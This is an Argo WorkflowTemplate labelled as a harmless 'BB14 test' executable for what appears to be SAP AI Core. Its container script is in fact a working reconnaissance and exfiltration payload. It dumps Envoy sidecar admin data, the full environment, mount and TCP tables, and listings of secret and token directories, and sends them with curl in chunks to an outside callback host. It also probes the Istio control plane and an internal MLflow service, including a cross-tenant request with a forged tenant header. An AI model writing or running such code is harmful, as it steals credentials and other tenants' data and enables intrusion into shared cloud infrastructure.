apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "3.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - sh
      - -c
      - |
        CB="https://www.masonhck.tech/cb.php"
        post() { curl -k -s -X POST "$CB?src=$1" -d @- ; }
        get() { curl -k -s "$CB?src=$1" ; }
        # Send data in chunks (callback truncates at ~300 chars)
        chunk_send() {
          local tag="$1"
          local data="$2"
          local chunk_size=250
          local i=0
          echo "$data" | fold -w $chunk_size | while read line; do
            echo "$line" | post "${tag}-chunk${i}"
            i=$((i+1))
          done
        }

        get "recon3-start-$(hostname)"

        # === 1. Envoy /clusters - lists ALL upstream services with IPs ===
        CLUSTERS=$(curl -k -s "http://127.0.0.1:15000/clusters" 2>&1)
        echo "$CLUSTERS" | head -c 800 | post "recon3-clusters-1"
        echo "$CLUSTERS" | tail -c +801 | head -c 800 | post "recon3-clusters-2"
        echo "$CLUSTERS" | tail -c +1601 | head -c 800 | post "recon3-clusters-3"
        echo "$CLUSTERS" | tail -c +2401 | head -c 800 | post "recon3-clusters-4"
        echo "$CLUSTERS" | tail -c +3201 | head -c 800 | post "recon3-clusters-5"
        echo "$CLUSTERS" | tail -c +4001 | head -c 800 | post "recon3-clusters-6"
        echo "$CLUSTERS" | tail -c +4801 | head -c 800 | post "recon3-clusters-7"
        echo "$CLUSTERS" | tail -c +5601 | head -c 800 | post "recon3-clusters-8"
        echo "$CLUSTERS" | tail -c +6401 | head -c 800 | post "recon3-clusters-9"
        echo "$CLUSTERS" | tail -c +7201 | head -c 800 | post "recon3-clusters-10"
        echo "$CLUSTERS" | wc -c | post "recon3-clusters-size"

        # === 2. Envoy /listeners - network rules ===
        LISTENERS=$(curl -k -s "http://127.0.0.1:15000/listeners" 2>&1)
        echo "$LISTENERS" | head -c 800 | post "recon3-listeners-1"
        echo "$LISTENERS" | tail -c +801 | head -c 800 | post "recon3-listeners-2"
        echo "$LISTENERS" | tail -c +1601 | head -c 800 | post "recon3-listeners-3"

        # === 3. Envoy /server_info - version and config ===
        curl -k -s "http://127.0.0.1:15000/server_info" 2>&1 | head -c 800 | post "recon3-server-info"

        # === 4. Full env dump in chunks ===
        ENVDATA=$(env | sort)
        echo "$ENVDATA" | head -c 800 | post "recon3-env-1"
        echo "$ENVDATA" | tail -c +801 | head -c 800 | post "recon3-env-2"
        echo "$ENVDATA" | tail -c +1601 | head -c 800 | post "recon3-env-3"

        # === 5. Probe ml-tracking-service directly ===
        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 800 | post "recon3-tracking-root"
        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | head -c 800 | post "recon3-tracking-experiments"
        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/runs/search" -X POST -H "Content-Type: application/json" -d '{"experiment_ids":["0","1","2","3","4","5"]}' 2>&1 | head -c 800 | post "recon3-tracking-runs-1"
        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/runs/search" -X POST -H "Content-Type: application/json" -d '{"experiment_ids":["0","1","2","3","4","5"]}' 2>&1 | tail -c +801 | head -c 800 | post "recon3-tracking-runs-2"
        # Try with AI-Main-Tenant header for OTHER tenant
        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" -H "AI-Main-Tenant: default" 2>&1 | head -c 800 | post "recon3-tracking-other-tenant"

        # === 6. Envoy config_dump clusters section (service discovery) ===
        CONFIG=$(curl -k -s "http://127.0.0.1:15000/config_dump?resource=dynamic_active_clusters" 2>&1)
        echo "$CONFIG" | head -c 800 | post "recon3-dynamic-clusters-1"
        echo "$CONFIG" | tail -c +801 | head -c 800 | post "recon3-dynamic-clusters-2"
        echo "$CONFIG" | tail -c +1601 | head -c 800 | post "recon3-dynamic-clusters-3"
        echo "$CONFIG" | tail -c +2401 | head -c 800 | post "recon3-dynamic-clusters-4"
        echo "$CONFIG" | tail -c +3201 | head -c 800 | post "recon3-dynamic-clusters-5"
        echo "$CONFIG" | tail -c +4001 | head -c 800 | post "recon3-dynamic-clusters-6"
        echo "$CONFIG" | tail -c +4801 | head -c 800 | post "recon3-dynamic-clusters-7"
        echo "$CONFIG" | tail -c +5601 | head -c 800 | post "recon3-dynamic-clusters-8"

        # === 7. Try Envoy /stats to see mesh traffic ===
        curl -k -s "http://127.0.0.1:15000/stats" 2>&1 | grep "cluster\." | head -c 800 | post "recon3-stats-clusters"

        # === 8. Istiod direct access (control plane) ===
        # Try common Istiod ports
        curl -k -s --connect-timeout 3 "https://istiod.istio-system.svc.cluster.local:15012/debug/endpointz" 2>&1 | head -c 800 | post "recon3-istiod-endpoints"
        curl -k -s --connect-timeout 3 "https://istiod.istio-system.svc.cluster.local:15014/debug/configz" 2>&1 | head -c 800 | post "recon3-istiod-config"

        # === 9. Mount info (full) ===
        cat /proc/self/mountinfo 2>/dev/null | head -c 800 | post "recon3-mounts-1"
        cat /proc/self/mountinfo 2>/dev/null | tail -c +801 | head -c 800 | post "recon3-mounts-2"

        # === 10. /proc/net/tcp decoded ===
        cat /proc/net/tcp 2>/dev/null | head -c 800 | post "recon3-tcp-1"
        cat /proc/net/tcp6 2>/dev/null | head -c 800 | post "recon3-tcp6-1"

        # === 11. Check for Istio token/certs (used for mTLS) ===
        ls -la /var/run/secrets/istio/ 2>/dev/null | post "recon3-istio-secrets"
        ls -la /var/run/secrets/tokens/ 2>/dev/null | post "recon3-istio-tokens"
        find /var/run/secrets/ -type f 2>/dev/null | head -20 | post "recon3-all-secrets"
        # Istio stores certs in /etc/certs or /var/run/secrets/istio.io
        ls -la /etc/certs/ 2>/dev/null | post "recon3-istio-certs"
        find /etc/istio/ -type f 2>/dev/null | head -20 | post "recon3-istio-etc"

        # === 12. Try quitquitquit on Istio sidecar (if works = sidecar control) ===
        # DON'T actually quit - just check if endpoint exists
        curl -k -s --connect-timeout 2 "http://127.0.0.1:15020/healthz/ready" 2>&1 | post "recon3-istio-health"
        curl -k -s --connect-timeout 2 "http://127.0.0.1:15000/help" 2>&1 | head -c 800 | post "recon3-envoy-help"

        get "recon3-done-$(hostname)"
      resources:
        limits:
          cpu: "1"
          memory: "1Gi"
        requests:
          cpu: "100m"
          memory: "256Mi"
